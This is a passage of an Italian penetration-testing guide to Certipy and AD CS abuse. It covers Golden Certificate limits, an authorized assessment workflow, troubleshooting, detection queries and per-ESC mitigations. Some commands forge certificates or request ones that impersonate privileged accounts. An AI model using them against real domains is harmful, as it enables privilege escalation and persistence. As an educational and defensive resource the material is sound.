  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -validity-period 7 \
  -out 'administrator-7days.pfx'
```

### Limiti del Golden Certificate

```text
La CA deve essere ancora trusted dai client/DC
Il mapping deve associare il certificato all'account desiderato
EKU/Application Policies devono essere compatibili con il servizio
CRL/AIA e chain possono influire sulla validazione
Una rotazione corretta della CA può invalidare la persistenza
L'assenza di request ID non significa assenza totale di telemetry
```

La chiave CA compromessa è un incidente Tier 0. La remediation può richiedere nuova chiave/certificato CA, revisione della chain, revoca, ripubblicazione, aggiornamento NTAuth e re-enrollment dei certificati dipendenti.

***

## Certipy vs Certify: quale usare?

| Aspetto                | Certipy                            | Certify                                         |
| ---------------------- | ---------------------------------- | ----------------------------------------------- |
| Piattaforma principale | Linux, macOS, Windows con Python   | Windows/.NET                                    |
| Enumerazione AD CS     | Completa, output testuale/JSON/CSV | Molto utile da host Windows                     |
| ESC coperti            | ESC1-ESC17 nella versione 5.1      | Dipende dalla versione/fork                     |
| Richiesta certificati  | RPC, Web, DCOM                     | API Windows native                              |
| PKINIT e recupero hash | Integrati in `auth`                | Di solito richiede tool aggiuntivi              |
| NTLM relay AD CS       | Integrato                          | Non è il suo focus principale                   |
| Shadow Credentials     | Integrato                          | Non integrato nello stesso workflow             |
| Template manipulation  | Integrata                          | Supporto diverso in base alla build             |
| Golden Certificate     | Integrato                          | Richiede altri strumenti/workflow               |
| Miglior contesto       | Workstation Linux da pentest       | Foothold Windows e operazioni in-memory/on-host |

I due tool non sono rivali assoluti. Un workflow reale può usare [Certify](https://hackita.it/articoli/certify/) su Windows per discovery o richiesta e Certipy su Linux per autenticazione, parsing, relay e gestione PFX.

***

## Workflow completo di assessment AD CS

### Fase 1 — Scope e prerequisiti

```text
☐ Dominio e forest autorizzati
☐ IP/FQDN dei DC
☐ CA e server CA in scope
☐ Coercion e relay esplicitamente permessi
☐ Modifica template/CA permessa o vietata
☐ Account di test e account target concordati
☐ Piano di rollback per oggetti AD e PKI
```

### Fase 2 — Discovery a basso impatto

```bash
certipy find \
  -u 'audituser@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -json -csv \
  -output 'corp-baseline'
```

### Fase 3 — Triage dei finding raggiungibili

```bash
certipy find \
  -u 'audituser@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -hide-admins -stdout
```

Ordine di priorità:

```text
1. Controllo CA/private key: ESC5/ESC12
2. ACL CA: ESC7
3. Template direttamente sfruttabili: ESC1/2/3/4/15
4. Relay: ESC8/11
5. Mapping e SID extension: ESC6/9/10/16
6. Issuance policy e explicit mapping: ESC13/14
7. Server impersonation: ESC17
```

### Fase 4 — Validazione minima dell'impatto

Per un template sospetto:

```text
☐ Il template è pubblicato?
☐ L'utente corrente può enrollarsi?
☐ Il certificato viene effettivamente emesso?
☐ Quale identità compare nel PFX?
☐ PKINIT o Schannel accettano il certificato?
☐ Quali privilegi effettivi ottiene l'identità?
☐ Esiste una mitigation già attiva che interrompe la catena?
```

### Fase 5 — Cleanup

```text
☐ Revoca o segnala i certificati di test secondo ROE
☐ Ripristina template da backup JSON
☐ Ripristina UPN/SPN/DNS modificati
☐ Rimuovi la sola Shadow Credential aggiunta
☐ Disabilita template pubblicati solo per il test
☐ Rimuovi officer/manager aggiunti
☐ Elimina account macchina creati per il test
☐ Distruggi in modo sicuro PFX, ccache, kirbi e key file
☐ Verifica lo stato finale con un secondo `find`
```

### Fase 6 — Evidenze da consegnare

```text
Timestamp UTC
Comando e versione Certipy
Identità usata
CA e template coinvolti
Request ID e seriale certificato
SAN, SID extension, EKU e application policy
Output di autenticazione con segreti oscurati
ACL che rende la tecnica raggiungibile
Event ID correlati
Stato prima/dopo il cleanup
Mitigazione specifica e test di retest
```

***

## Troubleshooting Certipy: errori comuni e soluzione

### `CERTSRV_E_TEMPLATE_DENIED`

```text
The permissions on the certificate template do not allow the current user to enroll
```

Controlli:

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -stdout
```

Verifica template pubblicato, diritti Enroll, gruppi annidati, manager approval e authorized signatures. In ESC7, salva request ID e private key se la catena prevede approvazione successiva.

### `CERTSRV_E_UNSUPPORTED_CERT_TYPE`

```text
The requested certificate template is not supported by this CA
```

Il template può esistere in AD ma non essere pubblicato sulla CA scelta.

```bash
certipy ca \
  -u 'utente@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -list-templates
```

### `CERTSRV_E_SUBJECT_DNS_REQUIRED`

Il template richiede un DNS SAN derivato o esplicito. Per un account macchina:

```bash
certipy req \
  -u 'machineuser@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'Machine' \
  -dns 'host01.corp.local'
```

Se il template costruisce il subject da AD, verifica che l'account disponga di `dNSHostName` coerente.

### `CERTSRV_E_PENDING`

La richiesta richiede manager approval.

```text
Annota Request ID
Salva la private key
Attendi approvazione legittima o usa ESC7 solo se autorizzato
Recupera con certipy req -retrieve ID
```

### `KDC_ERR_PADATA_TYPE_NOSUPP`

Il KDC non supporta PKINIT nel contesto corrente, spesso perché il Domain Controller non dispone di un certificato KDC adatto o la chain non è valida.

Prova a verificare Schannel:

```bash
certipy auth \
  -pfx 'identity.pfx' \
  -dc-ip '10.0.0.10' \
  -ldap-shell
```

Non confondere “PKINIT non disponibile” con “certificato inutile”: altri servizi certificate-based possono accettarlo.

### `KRB_AP_ERR_SKEW` o clock skew

Kerberos tollera normalmente pochi minuti di differenza.

```bash
sudo timedatectl set-ntp true
```

```bash
sudo ntpdate -u '10.0.0.10'
```

Su distribuzioni che non includono `ntpdate`, usa `chrony` o `systemd-timesyncd` secondo le policy del sistema.

### DNS e `KDC_ERR_S_PRINCIPAL_UNKNOWN`

Con Kerberos usa FQDN e risoluzione coerente:

```bash
getent hosts 'DC01.corp.local'
getent hosts 'CA01.corp.local'
```

```bash
certipy find \
  -k -no-pass \
  -u 'utente@corp.local' \
  -dc-host 'DC01.corp.local' \
  -target 'DC01.corp.local' \
  -ns '10.0.0.10' \
  -vulnerable -stdout
```

### LDAPS non disponibile

Certipy usa LDAPS come default per diverse operazioni LDAP. In un lab dove 636 non è disponibile:

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -ldap-scheme 'ldap' \
  -ldap-port 389 \
  -vulnerable -stdout
```

Non disabilitare signing o channel binding come “soluzione” in produzione. I flag `-no-ldap-signing`, `-no-ldap-channel-binding` e `-no-channel-binding` servono a diagnosticare compatibilità o testare configurazioni autorizzate, ma riducono le protezioni della connessione.

### `RPC_S_ACCESS_DENIED`

Possibili cause:

```text
ACL CA insufficienti
firewall/RPC dynamic ports
DCOM hardening
account non autorizzato
endpoint errato
protocollo di enrollment non disponibile
```

Prova a distinguere reachability e autorizzazione:

```bash
nc -vz 'CA01.corp.local' 135
nc -vz 'CA01.corp.local' 445
```

Poi confronta RPC, Web e DCOM soltanto se disponibili e in scope.

### Il certificato è emesso ma `auth` dice `Could not find identification in the provided certificate`

Ispeziona SAN, subject e SID extension:

```bash
openssl pkcs12 \
  -in 'identity.pfx' \
  -clcerts -nokeys \
  -passin pass: \
  | openssl x509 -text -noout
```

Specifica username e dominio:

```bash
certipy auth \
  -pfx 'identity.pfx' \
  -dc-ip '10.0.0.10' \
  -username 'utente' \
  -domain 'corp.local'
```

### `Object SID mismatch` o mapping rifiutato

Verifica:

```text
SID corretto dell'account target
SID security extension emessa dalla CA
SAN URL SID
UPN/DNS coerente con il tipo di account
KB5014754 e Full Enforcement sui DC
ESC9/ESC16 realmente presenti
mapping espliciti altSecurityIdentities
```

### `Connection refused` su `/certsrv/`

Il Web Enrollment può non essere installato, può usare HTTPS, un virtual host differente o una porta non standard.

```bash
curl -k -I 'https://CA01.corp.local/certsrv/'
```

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -template 'User' \
  -web -http-scheme 'https' -http-port 443
```

### La CA non compare in `find`

Prova:

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -dc-only -stdout
```

Se `-dc-only` trova gli oggetti ma la raccolta completa fallisce, il problema può essere reachability del server CA, RPC/DCOM, DNS o autorizzazione remota.

***

## OPSEC e footprint: cosa lascia Certipy

“OPSEC” in un penetration test non significa cancellare log o nascondere attività. Significa conoscere l'impatto, ridurre operazioni non necessarie, concordare le azioni invasive e lasciare l'ambiente nello stato previsto dalle regole d'ingaggio.

| Operazione        | Footprint principale                                           | Rischio operativo                            |
| ----------------- | -------------------------------------------------------------- | -------------------------------------------- |
| `find`            | Query LDAP, connessioni RPC/DCOM alla CA, check Web Enrollment | Basso/medio, dipende dal volume e dalla rete |
| `req`             | Nuova richiesta nel database CA, eventi di richiesta/emissione | Basso se usa account/template di test        |
| `auth`            | Richiesta TGT sul DC o bind LDAPS Schannel                     | Basso/medio                                  |
| `relay`           | Listener SMB, autenticazione NTLM relayed, richiesta CA        | Alto, richiede autorizzazione esplicita      |
| `shadow add/auto` | Modifica `msDS-KeyCredentialLink`, autenticazione PKINIT       | Alto sull'oggetto target                     |
| `template`        | Modifica di un oggetto certificate template in AD              | Alto e potenzialmente domain-wide            |
| `ca`              | Modifica ruoli, template pubblicati o stato richieste          | Molto alto, Tier 0                           |
| `ca -backup`      | Operazioni remote sul server CA, servizi e file sensibili      | Critico                                      |
| `forge`           | Nessuna richiesta al CA, ma autenticazioni successive visibili | Critico se usato con chiave CA reale         |
| `account`         | Creazione/modifica/cancellazione oggetti AD                    | Alto                                         |
| `parse`           | Solo lettura locale del dump                                   | Basso                                        |

### Pratiche corrette durante il test

```text
Usa un account di test quando basta a dimostrare il finding
Imposta nomi output espliciti e una directory per engagement
Registra hash SHA-256 dei file di backup/configurazione
Non usare `shadow clear` come cleanup
Non disabilitare template preesistenti senza baseline
Non eliminare richieste dal database CA per coprire attività
Non cancellare Windows Event Log
Non lasciare PFX o ccache su filesystem condivisi
Non copiare la chiave CA se la prova può fermarsi prima
```

### Directory di lavoro consigliata

```bash
mkdir -p certipy-engagement/{enum,requests,pfx,templates,evidence,cleanup}
chmod 700 certipy-engagement certipy-engagement/*
```

```bash
sha256sum \
  certipy-engagement/templates/*.json \
  certipy-engagement/pfx/*.pfx \
  > certipy-engagement/evidence/sha256.txt
```

Dopo la consegna, distruggi il materiale secondo le procedure concordate con il cliente e le policy di data retention.

***

## Detection: come rilevare Certipy e gli abusi AD CS

Una detection efficace non cerca la stringa `certipy`. Cerca la **catena comportamentale**:

```text
Enumerazione di oggetti PKI
        ↓
Modifica ACL/template/account
        ↓
Richiesta o approvazione certificato anomala
        ↓
PKINIT/Schannel per un'identità privilegiata
        ↓
Uso successivo dei privilegi
```

### Abilitare l'auditing AD CS

Sul server CA abilita gli eventi necessari nelle proprietà della CA e configura la raccolta centralizzata. Gli Event ID più importanti includono:

| Event ID | Significato                                       | Uso detection                                    |
| -------- | ------------------------------------------------- | ------------------------------------------------ |
| 4882     | Modifica delle permission di Certificate Services | ESC5/ESC7 e manomissione ACL CA                  |
| 4885     | Modifica del filtro di audit della CA             | Possibile riduzione della visibilità             |
| 4886     | Ricevuta una richiesta di certificato             | Correlazione requester, attributi, template      |
| 4887     | Richiesta approvata e certificato emesso          | Certificati privilegiati o SAN anomali           |
| 4888     | Richiesta negata                                  | Tentativi falliti o discovery aggressiva         |
| 4889     | Richiesta impostata pending                       | Manager approval e catene ESC7                   |
| 4890     | Modifica impostazioni Certificate Manager         | Aggiunta officer/ruoli                           |
| 4891     | Modifica configurazione CA                        | ESC6/ESC11 o altre policy alterate               |
| 4896     | Righe eliminate dal database certificati          | Possibile manomissione o cleanup non autorizzato |
| 4898     | Template caricato dalla CA                        | Pubblicazione di template inatteso               |
| 4899     | Certificate template aggiornato                   | ESC4 o change amministrativo                     |
| 4900     | Security descriptor del template aggiornata       | ACL template e owner deboli                      |

Gli eventi compaiono soltanto se l'auditing pertinente è abilitato. Testa la configurazione in un ambiente controllato e verifica che SIEM/WEF ricevano realmente i campi necessari.

### Eventi sui Domain Controller

| Event ID | Significato                                         | Correlazione utile                                |
| -------- | --------------------------------------------------- | ------------------------------------------------- |
| 4768     | Emissione di un TGT Kerberos                        | PKINIT dopo una richiesta certificato             |
| 4771     | Pre-auth Kerberos fallita                           | Errori PKINIT, mapping o certificato KDC          |
| 4769     | Richiesta TGS                                       | Uso successivo del TGT ottenuto                   |
| 5136     | Oggetto AD modificato                               | Template, `msDS-KeyCredentialLink`, UPN, OID, ACL |
| 5137     | Oggetto AD creato                                   | Nuovo computer/account per la catena              |
| 5141     | Oggetto AD eliminato                                | Cleanup o cancellazione sospetta                  |
| 4741     | Computer account creato                             | Uso di MachineAccountQuota/account creation       |
| 4662     | Operazione su oggetto AD, se audit/SACL configurati | Scrittura attributi e controllo ACL               |

L'Event ID 5136 richiede una SACL adeguata sull'oggetto o attributo da monitorare. Senza Audit Directory Service Changes e SACL, non aspettarti telemetria completa.

### Attributi AD da monitorare

```text
msDS-KeyCredentialLink
userPrincipalName
dNSHostName
servicePrincipalName
altSecurityIdentities
nTSecurityDescriptor
msPKI-Certificate-Name-Flag
msPKI-Enrollment-Flag
pKIExtendedKeyUsage
msPKI-Certificate-Policy
msDS-OIDToGroupLink
certificateTemplates su pKIEnrollmentService
```

### PowerShell: estrarre gli eventi CA principali

```powershell
$Ids = 4882,4885,4886,4887,4888,4889,4890,4891,4896,4898,4899,4900

Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = $Ids
    StartTime = (Get-Date).AddDays(-7)
} | Select-Object TimeCreated, Id, MachineName, Message
```

Esporta in CSV:

```powershell
$Ids = 4882,4885,4886,4887,4888,4889,4890,4891,4896,4898,4899,4900

Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = $Ids
    StartTime = (Get-Date).AddDays(-30)
} | Select-Object TimeCreated, Id, MachineName, Message |
    Export-Csv -NoTypeInformation -Encoding UTF8 '.\adcs-events.csv'
```

### Splunk: richieste ed emissioni anomale

Adatta indici e field extraction al tuo ambiente:

```spl
index=wineventlog sourcetype="WinEventLog:Security"
(EventCode=4886 OR EventCode=4887 OR EventCode=4888 OR EventCode=4889)
| stats count values(Requester) values(Subject) values(Attributes)
  by host EventCode Request_ID
| sort - _time
```

Ricerca cambiamenti Tier 0:

```spl
index=wineventlog sourcetype="WinEventLog:Security"
(EventCode=4882 OR EventCode=4885 OR EventCode=4890 OR EventCode=4891
 OR EventCode=4896 OR EventCode=4898 OR EventCode=4899 OR EventCode=4900)
| table _time host EventCode SubjectUserName Message
| sort - _time
```

Correlazione richiesta certificato → TGT:

```spl
index=wineventlog sourcetype="WinEventLog:Security"
(EventCode=4887 OR EventCode=4768)
| transaction user maxspan=10m
| search EventCode=4887 EventCode=4768
| table _time user host EventCode src_ip Message
```

`transaction` può essere costoso: in produzione preferisci correlazioni basate su data model, `stats` e finestre temporali.

### Microsoft Sentinel / Defender XDR: KQL di base

Eventi AD CS ad alto valore:

```kusto
SecurityEvent
| where EventID in (4882, 4885, 4886, 4887, 4888, 4889, 4890, 4891, 4896, 4898, 4899, 4900)
| project TimeGenerated, Computer, EventID, Account, Activity, EventData
| order by TimeGenerated desc
```

Modifiche a oggetti PKI o Key Credential:

```kusto
SecurityEvent
| where EventID == 5136
| where EventData has_any (
    "msDS-KeyCredentialLink",
    "altSecurityIdentities",
    "msPKI-Certificate-Name-Flag",
    "msPKI-Enrollment-Flag",
    "pKIExtendedKeyUsage",
    "msDS-OIDToGroupLink"
)
| project TimeGenerated, Computer, Account, EventData
| order by TimeGenerated desc
```

Adatta i nomi delle colonne al connettore e al parsing effettivo del workspace.

### Detection ESC1/ESC6/ESC15

Cerca certificati in cui:

```text
Requester non coincide con SAN UPN / Subject privilegiato
SID nel certificato appartiene a un account diverso dal requester
Template normalmente server-only emette Client Authentication
Application Policies richieste differiscono dal baseline del template
Account a basso privilegio richiede un certificato per Administrator/DC
Request ID e seriale sono seguiti da PKINIT sul DC
```

### Detection ESC4

Alert su:

```text
4899/4900 fuori change window
5136 su oggetti CN=Certificate Templates
owner del template cambiato verso gruppo non privilegiato
abilitazione di Enrollee Supplies Subject
aggiunta di Client Authentication/Any Purpose
rimozione Manager Approval o authorized signatures
aggiunta Enroll ad Authenticated Users/Domain Users
```

### Detection ESC7

Correla:

```text
4882 o 4890: nuova permission/officer
4898: template SubCA pubblicato
4888: richiesta inizialmente negata
4887: stessa Request ID successivamente approvata
4768: TGT per account privilegiato poco dopo
```

### Detection ESC8/ESC11

Indicatori utili:

```text
Accesso /certsrv/ da workstation o subnet insolite
Autenticazione NTLM di un DC verso il server CA
Richiesta DomainController/Machine con requester e sorgente anomali
Connessioni SMB verso un host non server immediatamente prima della richiesta
Burst di coercion RPC e autenticazioni NTLM
Uso dell'interfaccia RPC enrollment da origini non amministrative
```

Non bloccare automaticamente ogni richiesta macchina: auto-enrollment e processi legittimi possono generare pattern simili. Crea baseline per CA, template, source subnet e frequenza.

### Detection Shadow Credentials

La regola più importante è una modifica a:

```text
msDS-KeyCredentialLink
```

Alert quando:

```text
Subject non è il sistema di provisioning previsto
Target è un account privilegiato o computer Tier 0
Aggiunta e rimozione avvengono in pochi minuti
Segue Event ID 4768 per lo stesso account
Device ID non corrisponde a enrollment Windows Hello noto
```

### Detection Golden Certificate

Non esiste una request CA da correlare. Cerca invece:

```text
PKINIT per account privilegiato senza emissione recente corrispondente
Certificato con seriale, validità o subject fuori baseline
Issuer valido ma certificato assente dal database CA
Certificate chain valida con proprietà inconsuete
Uso di account disabilitato/rinominato tramite certificato
TGT certificate-based da host mai usato per smart card/WHfB
```

Questa detection richiede telemetria PKI, DC e identity correlata. Conserva il database CA e gli audit in un sistema protetto e separato.

***

## Mitigazione completa AD CS

### Baseline dei certificate template

Per ogni template pubblicato:

```text
☐ Business owner identificato
☐ Template owner privilegiato e monitorato
☐ Enroll limitato a gruppi dedicati
☐ Autoenroll concesso solo dove necessario
☐ Enrollee Supplies Subject disabilitato per auth user/machine
☐ EKU minimi, niente Any Purpose senza requisito documentato
☐ Manager Approval sui template ad alto impatto
☐ Authorized signatures per Enrollment Agent sensibili
☐ SID security extension non disabilitata
☐ Schema version aggiornata quando possibile
☐ Template inutilizzati rimossi dalla CA
```

### Mitigazione ESC1/ESC6

```text
Usa “Build from this Active Directory information”
Rimuovi `EDITF_ATTRIBUTESUBJECTALTNAME2` se non indispensabile
Restringi Enroll
Mantieni strong certificate mapping
Aggiungi approval/firme quando il subject deve essere fornito
Monitora SAN UPN/DNS diversi dal requester
```

### Mitigazione ESC2/ESC3

```text
Rimuovi Any Purpose e EKU vuoti da template enrolabili da utenti comuni
Limita Certificate Request Agent a gruppi dedicati
Configura Enrollment Agent Restrictions sulla CA
Richiedi authorized signatures sui template target
Monitora richieste on-behalf-of
```

### Mitigazione ESC4

```text
Owner del template: PKI admin/Tier 0 dedicato
Rimuovi GenericAll, GenericWrite, WriteDacl, WriteOwner da gruppi non privilegiati
Abilita SACL e audit 5136/4899/4900
Controlla inheritance e gruppi annidati
Revisiona template duplicati e legacy
```

### Mitigazione ESC5/ESC12 e protezione CA key

```text
Tratta server CA come Tier 0
Usa amministrazione separata e workstation privilegiate
Riduci local admin e logon interattivo
Proteggi backup e condivisioni amministrative
Usa HSM con ruoli separati e audit indipendente
Impedisci export della chiave quando possibile
Monitora backup, servizi, accessi SMB e uso HSM
Pianifica una procedura di key compromise/CA rollover
```

### Mitigazione ESC7

```text
Manage CA a pochissimi PKI admin dedicati
Manage Certificates a Certificate Officer separati
Role separation dove compatibile
Alert su 4882/4890 e pubblicazione SubCA
Revisiona periodicamente ACL CA
Evita gruppi ampi o helpdesk nei ruoli CA
```

### Mitigazione ESC8

Sugli endpoint IIS AD CS:

```text
Forza HTTPS
Abilita Extended Protection for Authentication
Imposta EPA su Required dove compatibile
Disabilita NTLM se non necessario
Preferisci Kerberos e SPN corretti
Rimuovi Web Enrollment/CES inutilizzati
Applica SMB signing e protezioni contro coercion
Segmenta server CA e limita le sorgenti
```

Non considerare HTTPS da solo sufficiente: senza EPA/channel binding, un endpoint HTTPS può restare relayable in determinati scenari.

### Mitigazione ESC9/ESC16 e KB5014754

Nel 2026 la baseline deve essere Full Enforcement sui Domain Controller aggiornati. Verifica che:

```text
SID security extension sia emessa
StrongCertificateBindingEnforcement non sia regredita
mapping deboli legacy siano rimossi
certificati legacy siano re-enrolled o mappati in modo forte
compatibility workaround temporanei non siano rimasti attivi
```

Non risolvere problemi applicativi disabilitando la SID extension a livello CA.

### Mitigazione ESC10/ESC14

```text
Usa mapping espliciti forti, basati su issuer/serial o SKI dove appropriato
Evita mapping subject/issuer ambiguo
Restringi scrittura su altSecurityIdentities
Monitora 5136 sull'attributo
Revisiona Schannel CertificateMappingMethods sui server
Disabilita mapping legacy non necessario
```

### Mitigazione ESC11

Abilita packet privacy sull'interfaccia RPC enrollment:

```cmd
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc
net start certsvc
```

Verifica prima i client legacy e pianifica la modifica. Microsoft Defender for Identity può esporre una posture assessment specifica per questa condizione quando il sensore AD CS è distribuito.

### Mitigazione ESC13

```text
Revisiona tutti gli OID con msDS-OIDToGroupLink
Collega issuance policy soltanto a gruppi dedicati e non privilegiati
Restringi enrollment sui template che includono la policy
Monitora modifiche OID e membership del gruppo
Rimuovi link non usati
```

### Mitigazione ESC15

```text
Installa gli aggiornamenti Microsoft che correggono CVE-2024-49019
Identifica template schema V1 ancora pubblicati
Migra a template moderni quando possibile
Monitora application policy arbitrarie nelle richieste
Conferma la patch con un test controllato, non solo inventario OS
```

### Mitigazione ESC17

```text
Non permettere subject/DNS arbitrari su template Server Authentication aperti
Restringi enrollment a sistemi di provisioning dedicati
Valida ownership del DNS richiesto
Usa approval per certificati server sensibili
Monitora certificati per nomi Tier 0 e infrastruttura update/proxy
Proteggi DNS, routing e trust store dei client
```

### Continuous assessment

Esegui periodicamente:

```bash
certipy find \
  -u 'adcs-audit@corp.local' -p 'AuditAccountPassword!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable \
  -json -csv \
  -output "adcs-$(date +%F)"
```

Confronta gli output in version control privato o in un repository di compliance protetto. Non inserire password nei job schedulati: usa secret management, Kerberos o un sistema di assessment enterprise.

Microsoft Defender for Identity offre inoltre security posture assessment dedicate a varie condizioni AD CS, incluse configurazioni riconducibili a ESC4, ESC7, ESC8, ESC11 e altre debolezze PKI.

***

## Come scrivere un finding AD CS di qualità

### Titolo del finding

```text
Certificate Template ESC1 consente impersonation di account privilegiati
```

Evita titoli generici come:

```text
Certipy found vulnerability
AD CS insecure
Missing security
```

### Struttura

```text
Asset: CA01.corp.local / CORP-CA
Template: HelpDeskCert
Identità testata: CORP\helpdesk-test
Categoria: ESC1
Prerequisiti: Enroll + Enrollee Supplies Subject + Client Authentication
Mapping: Full Enforcement, SID target accettato
Impatto dimostrato: TGT per account di test privilegiato
Request ID: 42
Eventi correlati: 4886, 4887, 4768
Cleanup: certificato revocato / file distrutti secondo ROE
```

### Evidenza tecnica minima

```bash
certipy find ... -enabled -vulnerable -stdout
certipy account ... -user target read
certipy req ... -upn target@domain -sid TARGET_SID
certipy auth ... -no-hash
```

Oscura password, hash, private key, ticket e SID non necessari nella versione pubblica del report.

### Severità

Non tutti gli ESC sono automaticamente Critical. Valuta:

```text
Reachability dall'account compromesso
Privilegio dell'identità impersonabile
Necessità di coercion/MITM/posizione di rete
Modifiche invasive richieste
Mapping moderno che interrompe la catena
Presenza di approval o firme
Durata e riutilizzabilità del certificato
Possibilità di compromettere la chiave CA
```

Esempi orientativi:

| Scenario                                                       | Severità tipica                          |
| -------------------------------------------------------------- | ---------------------------------------- |
| ESC1 da Domain Users a Domain Admin, exploit dimostrato        | Critical                                 |
| ESC4 richiede WriteDacl già molto privilegiato, ma consente DA | High/Critical                            |
| ESC8 con DC coercibile e DomainController template             | Critical                                 |
| Template Any Purpose enrolabile ma senza target utile          | Medium/High                              |
| ESC17 su nome non sensibile e senza posizione MITM             | Low/Medium                               |
| Chiave CA compromessa / Golden Certificate                     | Critical                                 |
| Configurazione debole non raggiungibile                        | Informational/Low con rischio potenziale |

***

## FAQ su Certipy e AD CS

### Cos'è Certipy?

Certipy è un toolkit Python open-source per enumerare e valutare Active Directory Certificate Services. Supporta discovery di CA e template, tecniche ESC1-ESC17, richiesta di certificati, autenticazione PKINIT/Schannel, relay, Shadow Credentials, gestione dei template e Golden Certificate.

### Qual è la versione Certipy più recente?

Al momento di questa revisione la release stabile è **Certipy 5.1.0**, pubblicata il 23 giugno 2026. Verifica sempre con:

```bash
certipy -v
python3 -m pip index versions certipy-ad
```

### Qual è il primo comando da eseguire?

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -hide-admins -stdout
```

Usa poi JSON/CSV per conservare una baseline.

### Serve essere Domain Admin per usare Certipy?

No. Un normale account di dominio può enumerare gran parte degli oggetti AD CS. L'exploitability dipende però da enrollment rights, ACL, template, CA, mapping e servizi esposti.

### Perché su Kali il comando è `certipy-ad`?

Il pacchetto della distribuzione può rinominare il binario per evitare conflitti con altri progetti Python chiamati Certipy. Installando `certipy-ad` tramite pip, il comando è normalmente `certipy`.

### Certipy e Certify sono la stessa cosa?

No. Certipy è Python e integra l'intera catena da Linux o multipiattaforma. Certify è un tool .NET orientato a Windows. Possono essere usati insieme nello stesso engagement.

### Che differenza c'è tra `-dc-ip`, `-dc-host`, `-target` e `-target-ip`?

```text
-dc-ip     IP del Domain Controller
-dc-host   hostname del DC, importante per Kerberos
-target    nome DNS/IP del server a cui Certipy si connette
-target-ip IP da usare quando il nome target non risolve correttamente
```

Il server CA può essere diverso dal DC.

### `certipy find -vulnerable` trova ogni possibile catena?

No. Identifica molte configurazioni e valuta reachability tramite gruppi annidati, ma alcune tecniche dipendono da registro remoto, patch, posizione di rete, ACL su altri oggetti, mapping espliciti o concatenazioni non interamente osservabili da una singola query.

### Perché ESC1 fallisce anche se il template è vulnerabile?

Cause comuni:

```text
Template non pubblicato sulla CA scelta
utente senza Enroll effettivo
manager approval o firme richieste
SID target errato
Full Enforcement e strong mapping
PKINIT non configurato sul DC
certificato emesso senza EKU corretto
DNS/clock skew
```

### Perché `certipy auth` non restituisce sempre l'NT hash?

Il recupero hash è un tentativo successivo all'ottenimento del TGT e dipende dal protocollo, dal KDC e dall'identità. Il risultato minimo utile può essere soltanto la ccache. Usa `-no-hash` quando il TGT è sufficiente.

### Cosa significa `KDC_ERR_PADATA_TYPE_NOSUPP`?

Il KDC non accetta il tipo di pre-auth PKINIT richiesto, spesso perché il DC non ha un certificato Kerberos adatto. Prova Schannel LDAP e verifica la configurazione PKI del DC.

### ESC8 e ESC11 sono la stessa cosa?

No. Entrambe sono tecniche di NTLM relay verso AD CS:

```text
ESC8  → endpoint HTTP/IIS di enrollment
ESC11 → interfaccia RPC enrollment senza packet privacy
```

La sintassi `relay` cambia con il protocollo.

### Qual è la differenza tra ESC9 ed ESC16?

```text
ESC9  → un singolo template omette la SID security extension
ESC16 → la CA la disabilita globalmente per tutti i certificati interessati
```

Entrambe dipendono dal certificate mapping effettivo.

### Cos'è KB5014754 e perché cambia gli exploit AD CS?

KB5014754 ha introdotto certificate mapping più forte sui Domain Controller. Nel 2026 devi assumere Full Enforcement sui sistemi aggiornati: molte vecchie catene basate sul solo UPN non funzionano senza SID e condizioni aggiuntive.

### Cos'è un Golden Certificate?

È un certificato creato offline usando la private key compromessa della CA. Non genera una normale richiesta nel database CA e può impersonare identità accettate dal mapping finché la CA resta trusted e la chiave non viene sostituita.

### `certipy forge` genera automaticamente Domain Admin?

No. Devi possedere una CA key trusted, costruire un certificato con identità e policy compatibili e superare il mapping del servizio. La forgiatura è una capacità, non una garanzia universale.

### Come si prevengono Shadow Credentials?

Restringi la scrittura su `msDS-KeyCredentialLink`, monitora Event ID 5136 con SACL adeguata, proteggi account privilegiati e verifica anomalie Windows Hello for Business/Key Trust.

### Come verifico che il cleanup ESC4 sia riuscito?

Ripristina il JSON originale e riesegui `find`. Confronta flag, EKU, enrollment rights, owner e security descriptor con la baseline iniziale.

### Posso usare Certipy per la difesa?

Sì. `find` e `parse` sono utili per audit continuo, purple team, vulnerability management e verifica delle remediation. Eseguili con account dedicato e conserva output strutturati per il confronto.

### Certipy funziona senza LDAPS?

Sì, alcune operazioni possono usare LDAP con `-ldap-scheme ldap -ldap-port 389`, ma non tutte le funzionalità e non tutti gli ambienti lo consentono. Non disabilitare protezioni LDAP in produzione per compatibilità con il tool.

### Quali file prodotti da Certipy sono credenziali?

```text
.pfx / .p12
.key
.ccache
.kirbi
CA PFX e private key
backup template con informazioni sensibili sulle ACL
output JSON/CSV con struttura PKI e path di escalation
```

Proteggili, non inserirli in repository pubblici e distruggili secondo le ROE.

***

## Glossario rapido

| Termine                | Significato                                                                |
| ---------------------- | -------------------------------------------------------------------------- |
| AD CS                  | Active Directory Certificate Services                                      |
| CA                     | Certificate Authority                                                      |
| Enterprise CA          | CA integrata con Active Directory e template                               |
| Certificate Template   | Oggetto AD che definisce policy e autorizzazioni di enrollment             |
| CSR                    | Certificate Signing Request                                                |
| EKU                    | Extended Key Usage                                                         |
| Application Policy     | Policy/OID che definisce usi del certificato                               |
| SAN                    | Subject Alternative Name                                                   |
| UPN                    | User Principal Name                                                        |
| PKINIT                 | Pre-auth Kerberos basata su certificati                                    |
